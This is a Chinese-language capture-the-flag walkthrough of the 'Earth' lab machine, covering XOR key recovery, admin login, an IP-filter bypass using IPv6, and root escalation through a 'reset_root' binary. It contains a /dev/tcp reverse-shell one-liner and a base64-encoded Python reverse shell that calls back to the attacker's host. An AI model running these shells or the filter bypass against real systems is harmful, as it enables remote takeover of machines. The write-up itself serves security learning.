`fping -g  192.168.56.0/24 | grep alive`

```
192.168.56.1 is alive
192.168.56.100 is alive
192.168.56.105 is alive
```

nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202211802077.png)

---

添加`192.168.56.105	earth.local 192.168.56.105	terratest.earth.local`到`/etc/hosts`

dirsaech扫描到一个admin路径

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202211804419.png)

`https://earth.local/admin/`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202211822409.png)

好像没有注入点

`http://earth.local/`有一个加密输入框,测试得知是逐字符异或,但是要解密原始的三条密文还需要知道原始异或密钥

```
37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
```

`earth.local`中没有`robots.txt`但是在`https://terratest.earth.local/`却能够得到`robots.txt`

```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```

尝试读取`testingnotes.txt`

```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.

测试安全消息系统注意事项：
*使用 XOR 加密作为算法，在 RSA 中使用应该是安全的。
*地球已确认他们已收到我们发送的消息。
*testdata.txt 用于测试加密。
*terra 用作管理门户的用户名。
去做：
*我们如何安全地将我们的每月密钥发送到地球？还是我们应该每周更换密钥？
*需要测试不同的密钥长度以防止暴力破解。钥匙应该多长？
*需要改进消息界面和管理面板的界面，目前非常基础。
```

`testdata.txt`内容,长度为`403`,而第三个密文的长度为`806`,尝试恢复原始异或密钥

```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

```python
plaintext="According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago."
ciphertext="2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a"
ciphertext=bytearray.fromhex(ciphertext).decode()
for i in range(len(plaintext)):
    print(chr(ord(plaintext[i])^ord(ciphertext[i])),end="")
```

```
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```

原始异或密钥`earthclimatechangebad4humans`,尝试用这个密钥去恢复另外两个密文,但是无法恢复

已知用户名为`terra`,可以用密钥作为密码尝试进行登录

成功登录,得到一个`admin cli`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202211826112.png)

测试得知,存在长度限制(100),同时会判断是否存在ip地址,如果存在则会显示`Remote connections are forbidden.`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202211830617.png)

可以利用ipv6绕过

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202211830158.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202211854902.png)

`sh -i >& /dev/tcp/::ffff:c0a8:01d1/9001 0>&1`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202212245753.png)

这里是将ipv4地址转换为ipv6地址即`::ffff:c0a8:01d1`后才能够反弹

我一开始直接用了`ifconfig`里面的`inet6 fe80::6b85:d5c7:e6e8:3877  prefixlen 64  scopeid 0x20<link>`的这个ipv6地址,发现不能反弹

看了segmentfault上的这篇关于[ipv6介绍](https://segmentfault.com/a/1190000008794218)的文章才理解

我这里是将一个反弹shell的python文件base64编码后再上传到靶机并解码

```
echo -n "aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKaXA9IjEwLjQ1LjIzNC41" > /tmp/asdf
echo -n "MyIKcG9ydD04MDAwCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19T" >> /tmp/asdf
echo -n "VFJFQU0pCnMuY29ubmVjdCgoaXAscG9ydCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAy" >> /tmp/asdf
echo -n "KHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnA9c3VicHJvY2Vzcy5jYWxsKFsi" >> /tmp/asdf
echo -n "L2Jpbi9zaCIsIi1pIl0pCgojcHl0aG9uMyAtYyAnaW1wb3J0IHB0eTtwdHkuc3Bhd24oIi9iaW4v" >> /tmp/asdf
echo -n "YmFzaCIpJwo=" >> /tmp/asdf
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202211911267.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202211914627.png)

```
find / -user root -perm -4000 -print 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/reset_root
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
```

有个`reset_root`,可能是提权的点

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+3h] [rbp-10BDh] BYREF
  char v5[9]; // [rsp+Bh] [rbp-10B5h] BYREF
  int v6; // [rsp+14h] [rbp-10ACh]
  __int64 v7; // [rsp+18h] [rbp-10A8h]
  char v8; // [rsp+20h] [rbp-10A0h]
  __int64 v9[2]; // [rsp+30h] [rbp-1090h] BYREF
  char v10; // [rsp+40h] [rbp-1080h]
  char name[17]; // [rsp+50h] [rbp-1070h] BYREF
  char v12; // [rsp+61h] [rbp-105Fh]
  char v13[32]; // [rsp+1050h] [rbp-70h] BYREF
  char v14[32]; // [rsp+1070h] [rbp-50h] BYREF
  __int64 v15[2]; // [rsp+1090h] [rbp-30h] BYREF
  char v16; // [rsp+10A0h] [rbp-20h]
  _DWORD v17[4]; // [rsp+10B0h] [rbp-10h] BYREF

  strcpy((char *)v17, "palebluedot");
  v15[0] = 0x810190E07090904LL;
  v15[1] = 0x555C5D041C161D05LL;
  v16 = 94;
  strcpy(v13, "credentials root:theEarthisflat");
  v17[3] = 0;
  v9[0] = 0xD064314000C5BLL;
  v9[1] = 0x27077310B2A194ELL;
  v10 = 117;
  v6 = 853571;
  v7 = 0x620067075B15284ELL;
  v8 = 7;
  v4 = 0x20061E4312081C5BLL;
  strcpy(v5, "Q%\a\x1B");
  magic_cipher((__int64)v15, (__int64)v17, (__int64)v14, 17, 12);
  v14[17] = 0;
  puts("CHECKING IF RESET TRIGGERS PRESENT...");
  magic_cipher((__int64)v9, (__int64)v14, (__int64)name, 17, 18);
  v12 = 0;
  if ( !access(name, 0) )
    ++v17[3];
  magic_cipher((__int64)&v5[5], (__int64)v14, (__int64)name, 17, 18);
  v12 = 0;
  if ( !access(name, 0) )
    ++v17[3];
  magic_cipher((__int64)&v4, (__int64)v14, (__int64)name, 13, 18);
  name[13] = 0;
  if ( !access(name, 0) )
    ++v17[3];
  if ( v17[3] == 3 )
  {
    puts("RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth");
    setuid(0);
    system("/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd");
  }
  else
  {
    puts("RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.");
  }
  return 0;
}
```

`magic_cipher`是一个异或加密函数

下断点,动态调试,得到三个name

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202212137957.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202212137527.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202212137101.png)

分别是`/dev/shm/kHgTFI5G`,`/dev/shm/Zw7bV9U5`,`/tmp/kcM0Wewe`

通过反弹shell在靶机中建立这三个文件,从而满足reset_root的条件,从而修改root密码

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202212147727.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202212148612.png)